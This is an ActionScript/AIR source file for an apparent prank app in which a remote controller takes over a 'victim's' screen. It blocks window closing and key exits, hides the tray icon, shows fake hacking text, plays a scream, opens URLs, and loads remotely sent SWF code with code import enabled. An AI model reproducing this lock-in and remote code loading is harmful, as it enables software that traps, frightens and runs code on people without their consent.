package com.whoiam.views {
	import flash.system.Capabilities;
	import com.nurun.components.text.CssTextField;
	import com.nurun.structure.mvc.model.events.IModelEvent;
	import com.nurun.structure.mvc.views.AbstractView;
	import com.nurun.utils.array.ArrayUtils;
	import com.nurun.utils.draw.createRect;
	import com.nurun.utils.pos.PosUtils;
	import com.whoiam.components.SoundPlayer;
	import com.whoiam.components.VideoPlayer;
	import com.whoiam.controler.FrontControler;
	import com.whoiam.events.ConnectionManagerEvent;
	import com.whoiam.model.Model;
	import com.whoiam.p2p.ConnectionManager;
	import com.whoiam.vo.ActionType;
	import flash.desktop.NativeApplication;
	import flash.display.AVM1Movie;
	import flash.display.Graphics;
	import flash.display.Loader;
	import flash.display.MovieClip;
	import flash.display.Screen;
	import flash.display.Shape;
	import flash.events.Event;
	import flash.events.FocusEvent;
	import flash.events.IOErrorEvent;
	import flash.events.KeyboardEvent;
	import flash.events.MouseEvent;
	import flash.filesystem.File;
	import flash.filesystem.FileMode;
	import flash.filesystem.FileStream;
	import flash.geom.Rectangle;
	import flash.media.Sound;
	import flash.net.URLRequest;
	import flash.net.navigateToURL;
	import flash.system.LoaderContext;
	import flash.text.TextField;
	import flash.text.TextFieldAutoSize;
	import flash.text.TextFieldType;
	import flash.ui.Keyboard;
	import flash.utils.ByteArray;
	import flash.utils.clearInterval;
	import flash.utils.setInterval;
	import flash.utils.setTimeout;


	/**
	 * 
	 * @author durss
	 * @date 6 févr. 2013;
	 */
	public class ControledView extends AbstractView {
		private var _ready:Boolean;
		
		private var _blink:Shape;
		private var _glitches:Shape;
		
		private var _blinkIndex:int;
		private var _glitchIndex:int;
		private var _textfield:CssTextField;
		private var _sound:Sound;
		private var _hackLines:Array;
		private var _loader:Loader;
		private var _videoPlayer:VideoPlayer;
		private var _audioPlayer:SoundPlayer;
		private var _frameCheckInterval:uint;
		
		
		
		
		/* *********** *
		 * CONSTRUCTOR *
		 * *********** */
		/**
		 * Creates an instance of <code>ControledView</code>.
		 */
		public function ControledView() {
		}

		
		
		/* ***************** *
		 * GETTERS / SETTERS *
		 * ***************** */



		/* ****** *
		 * PUBLIC *
		 * ****** */
		/**
		 * Called on model's update
		 */
		override public function update(event:IModelEvent):void {
			var model:Model = event.model as Model;
			visible = model.connected && model.controledMode;
			if(visible && !_ready) {
				_ready = true;
				initialize();
			}
		}


		
		
		/* ******* *
		 * PRIVATE *
		 * ******* */
		/**
		 * Initialize the class.
		 */
		private function initialize():void {
			//Locks full screen exit and application killing
			stage.addEventListener(KeyboardEvent.KEY_DOWN, keyUpHandler);
			stage.nativeWindow.addEventListener(Event.CLOSE, closeHandler);
			stage.nativeWindow.addEventListener(Event.CLOSING, closeHandler);
			stage.nativeWindow.alwaysInFront = true;
			
			_blink		= addChild(createRect(0xffffffff)) as Shape;
			_glitches	= addChild(new Shape()) as Shape;
			_textfield	= addChild(new CssTextField("commandLines")) as CssTextField;
			_loader		= addChild(new Loader()) as Loader;
			_videoPlayer= addChild(new VideoPlayer()) as VideoPlayer;
			_audioPlayer= new SoundPlayer();
			
			_textfield.type = TextFieldType.INPUT;
			_textfield.width = 600;
			_textfield.background = true;
			_textfield.backgroundColor = 0;
			_textfield.autoSize = TextFieldAutoSize.NONE;
//			_textfield.filters = [new DropShadowFilter(0,0,0,1,3,3,2.5,1)];
			
			_sound = new Sound(new URLRequest("sounds/scream.mp3"));
			var hackFile:File = File.applicationDirectory.resolvePath("txt/commandlines.txt");
			var fs:FileStream = new FileStream();
			fs.open(hackFile, FileMode.READ);
			_hackLines = fs.readUTFBytes(fs.bytesAvailable).split("\n");
			
			//Remove tray/dock icon on windows.
			//Not on mac because this actually makes a dock icon appear.
			//At least i have to check if it's not simply an AIR bug or if it actually comes from that.
			//If this comment is still here, it's probably because i forgot to test or to remove it, dunno :D
			if (/.*windows.*/gi.test( Capabilities.os)) {
				NativeApplication.nativeApplication.icon.bitmaps = [];
			}
			
            var screens:Array = Screen.screens;
            var rect:Rectangle = new Rectangle();

			var i:int, len:int;
			len = screens.length;
            for(i;i<len;i++) {
                rect = rect.union(Screen(screens[i]).bounds);
            }
            this.stage.nativeWindow.bounds = rect;
			
			len = numChildren;
			for(i = 0; i < len; ++i) getChildAt(i).visible = false;
			
			
			ConnectionManager.getInstance().addEventListener(ConnectionManagerEvent.ON_DATA, actionHandler);
			_textfield.addEventListener(FocusEvent.FOCUS_IN, focusInTextHandler);
			_textfield.addEventListener(KeyboardEvent.KEY_DOWN, focusInTextHandler);
			_textfield.addEventListener(MouseEvent.MOUSE_DOWN, focusInTextHandler);
			
			_loader.contentLoaderInfo.addEventListener(Event.COMPLETE, loadFileCompleteHandler);
			_loader.contentLoaderInfo.addEventListener(IOErrorEvent.IO_ERROR, loadFileErrorHandler);
		}
		
		/**
		 * Sets the selection to the end of the text
		 */
		private function focusInTextHandler(event:Event):void {
			_textfield.setSelection(_textfield.length, _textfield.length);
		}
		
		/**
		 * Called when a user ask us to do something.
		 */
		private function actionHandler(event:ConnectionManagerEvent):void {
			var i:int, len:int;
			
			switch(event.action){
				//__________________________________________________________ BLINK ACTION
				case ActionType.BLINK:
					_blink.width = stage.stageWidth;
					_blink.height = stage.stageHeight;
					if(_blinkIndex > 0) {
						_blinkIndex = 1;//reset to continue blink while getting command
						return;
					}
					addEventListener(Event.ENTER_FRAME, blinkEnterFrameHandler);
					break;
					
				//__________________________________________________________ GLITCH ACTION
				case ActionType.GLITCH:
					if(_glitchIndex > 0) {
						_glitchIndex = 1;//reset to continue blink while getting command
						return;
					}
					_glitches.visible = true;
					addEventListener(Event.ENTER_FRAME, glitchesEnterFrameHandler);
					break;
				
				
				//__________________________________________________________ WRITE ACTION
				// Called when controler write something in the text input
				case ActionType.WRITE:
					if(_textfield.length > 0) _textfield.text += "\n";
					_textfield.autoSize = TextFieldAutoSize.LEFT;
					//Clear
					if(event.data == "/clear") {
						_textfield.text = "";
						_textfield.visible = false;
					}else
					
					//Ask
					if(event.data == "/ask") {
						_textfield.text += "y:Yes    n:No\n";
						_textfield.visible = true;
					}else
					
					//Reset the victim's mode
					if(event.data == "/reset") {
						FrontControler.getInstance().reset();
					}else
					
					//Progress
					if(event.data == "/progress") {
						len = 100;
						var delay:Number = 0;
						for(i = 0; i < len; ++i) {
							if(Math.random() < .5) continue;
							setTimeout(actionHandler, delay, new ConnectionManagerEvent(ConnectionManagerEvent.ON_DATA, ActionType.WRITE, i+"%"));
							delay += Math.random()*100;
						}
						setTimeout(actionHandler, delay, new ConnectionManagerEvent(ConnectionManagerEvent.ON_DATA, ActionType.WRITE, "== COMPLETE =="));
					}else
					
					//Command
					if(event.data == "/cmd") {
						_textfield.text += String(ArrayUtils.getRandom(_hackLines)).replace(/(\r|\n)/g, "");
						_textfield.visible = true;
						if(Math.random() > .25) {
							setTimeout(actionHandler, 60 + Math.round(Math.random() * 100), event);
						}
					}else
					
					//Browser tab
					if(/^\/url /gi.test(event.data as String)) {
						var url:String = String(event.data).replace("/url ", "");
						if(!/^https?:\/\/.*/.test(url)) url = "http://"+url;
						navigateToURL(new URLRequest(url));
					}else
					
					//Normal text
					{
						_textfield.text += event.data;
						_textfield.visible = true;
					}
					
					changeHandler();
					break;
					
				//__________________________________________________________ SCREAM ACTION
				case ActionType.SCREAM:
					_sound.play();
					break;
					
				//__________________________________________________________ DEAD PIXEL ACTION
				case ActionType.DEAD_PIXEL:
					var colors:Array = [0, 0xff0000, 0x00ff00, 0x0000ff, 0xffff00, 0xff00ff, 0x00ffff];
					for(i = 0; i < 4; ++i) {
						graphics.beginFill(ArrayUtils.getRandom(colors), 1);
						graphics.drawRect(Math.round(Math.random() * stage.stageWidth), Math.round(Math.random() * stage.stageHeight), 1, 1);
						graphics.endFill();
					}
					break;
					
				//__________________________________________________________ FILE ACTION
				case ActionType.FILE:
					var fileName:String = event.data['name'] as String;
					var extension:String = fileName.replace(/.*\.(.{1,5})$/gi, "$1").toLowerCase();
					var obj:ByteArray = event.data['data'] as ByteArray;
					obj.position = 0;
					switch(extension){
						case "wmv":
						case "mp4":
						case "flv":
						case "avi":
						case "avi":
						case "m4u":
						case "m4v":
						case "mkv":
						case "mpg":
						case "mov":
						case "3gp":
							_videoPlayer.play(obj);
							break;
							
						case "m4a":
						case "mpa":
						case "wav":
						case "mp3":
						case "wma":
						case "mid":
							_audioPlayer.play(obj);
							break;
							
						default:
						case "png":
						case "jpeg":
						case "jpg":
						case "gif":
						case "bmp":
						case "tiff":
						case "swf":
							var context:LoaderContext = new LoaderContext(false, null, null);
							context.allowLoadBytesCodeExecution = true;
							context.allowCodeImport = true;
							_loader.loadBytes(obj, context);
							break;
					}
					break;
					
				default:
			}
			stage.nativeWindow.orderToFront();
			stage.nativeWindow.alwaysInFront = true;
		}
		
		/**
		 * Called when textfield's content changes.
		 */
		private function changeHandler(event:Event = null):void {
			var h:int = _textfield.height;
			_textfield.autoSize = TextFieldAutoSize.NONE;
			_textfield.height = Math.min(h + 5, Screen.mainScreen.bounds.height);
			_textfield.scrollV = _textfield.maxScrollV;
		}

		private function glitchesEnterFrameHandler(event:Event):void {
			var g:Graphics = _glitches.graphics;
			g.clear();
			
			if(++_glitchIndex > 8) {
				_glitchIndex = 0;
				_glitches.visible = false;
				removeEventListener(Event.ENTER_FRAME, glitchesEnterFrameHandler);
				return;
			}
			
			var i:int, len:int, s:Screen;
			len = Screen.screens.length;
			for(i = 0; i < len; ++i) {
				var j:int, lenJ:int;
				lenJ = Math.round(Math.random() * 10);
				s = Screen.screens[i];
				for(j = 0; j < lenJ; ++j) {
					g.beginFill(Math.random()>.5? 0 : 0xffffff);
					g.drawRect(	s.bounds.x + Math.random()*s.bounds.width * .8,
								s.bounds.y + Math.random()*s.bounds.height,
								Math.random()*s.bounds.width * .8,
								Math.random()*3);
				}
			}
		}

		private function blinkEnterFrameHandler(event:Event):void {
			_blink.visible = (++_blinkIndex)%2 == 0;
			if(_blinkIndex == 10) {
				_blink.visible = false;
				removeEventListener(Event.ENTER_FRAME, blinkEnterFrameHandler);
				_blinkIndex = 0;
			}
		}

		private function closeHandler(event:Event):void {
			event.preventDefault();
		}

		private function keyUpHandler(event:KeyboardEvent):void {
			if(event.target is TextField) {
				if(event.keyCode == Keyboard.ENTER) event.preventDefault();
				return;
			}
			event.stopPropagation();
			event.preventDefault();
		}
		
		/**
		 * Called when file loading inside Loader instance succeed.
		 */
		private function loadFileCompleteHandler(event:Event):void {
			_loader.visible = true;
			if(_loader.content is AVM1Movie || _loader.content is MovieClip) {
				_loader.content.addEventListener(Event.COMPLETE, hideImage);
				if(_loader.content is MovieClip) {
					//If the timeline has only one frame, display it for 2 seconds. Else, wait for the timeline to complete.
					_frameCheckInterval = setInterval(checkMCEnd, MovieClip(_loader.content).totalFrames == 1? 2000 : 50, _loader);
				}
			}else{
				setTimeout(hideImage, 30);
				//If it's an image, fill the screen with it.
				_loader.scaleX = _loader.scaleY = 1;
				var ratio:Number = Math.max(stage.stageWidth/_loader.content.width, stage.stageHeight/_loader.content.height);
				_loader.scaleX = _loader.scaleY = ratio;
			}
			PosUtils.centerInStage(_loader);
		}
		
		/**
		 * File loading in Loader failed. Try to play it on the video player.
		 */
		private function loadFileErrorHandler(event:IOErrorEvent):void {
			//Ignore
		}
		
		/**
		 * Hides the image after a short amount of time
		 */
		private function hideImage(event:Event = null):void {
			_loader.visible = false;
			_loader.unloadAndStop();
			clearInterval(_frameCheckInterval);
		}
		
		/**
		 * Checks if a SWF's mvoieclip completes
		 */
		private function checkMCEnd(target:MovieClip):void {
			if(target.currentFrame == target.totalFrames) hideImage();
		}
		
	}
}